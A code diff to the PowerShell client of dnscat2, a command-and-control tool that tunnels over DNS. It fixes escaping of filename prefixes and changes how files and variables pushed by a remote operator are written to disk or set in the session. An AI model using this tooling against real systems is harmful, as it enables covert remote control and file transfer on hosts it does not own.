@@ -711,7 +711,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 try {
                     $FileName = Convert-HexToString $Session.CommandFields.TrimEnd('00')
                     
-                    if ($FileName.StartsWith("bytes:$")) {
+                    if ($FileName.StartsWith("bytes:`$")) {
                         $Session["PSDownloadReady"] = $True
                         $Session["PSDownloadName"] = $FileName.Substring(7)
                         $Session["PSDownloadPacketIdBF"] = $Session.PacketIdBF
@@ -735,13 +735,13 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Data = $Session['CommandFields']
                     $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                     [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
-                    [byte[]]$Bytes = Convert-HexToBytes $Data
                     
-                    if ($FileName.StartsWith("bytes:$")) {
+                    if ($FileName.StartsWith("hex:`$")) {
                         $Session["PSUploadReady"] = $True
-                        $Session["PSUploadName"] = $FileName.Substring(7)
-                        $Session["PSUploadValue"] = $Bytes
+                        $Session["PSUploadName"] = $FileName.Substring(5)
+                        $Session["PSUploadValue"] = $Data
                     } else {
+                        [byte[]]$Bytes = Convert-HexToBytes $Data
                         [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
                     }
                 } catch {
@@ -1102,7 +1102,7 @@ function Start-Dnscat2 {
                     try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
                     $Sessions[$SessionId]["PSUploadReady"] = $False
                     $Sessions[$SessionId]["PSUploadName"] = ""
-                    $Sessions[$SessionId]["PSUploadValue"] = $null
+                    $Sessions[$SessionId]["PSUploadValue"] = ""
                 }
                 
                 # Execute PS downloads here for access to full scope
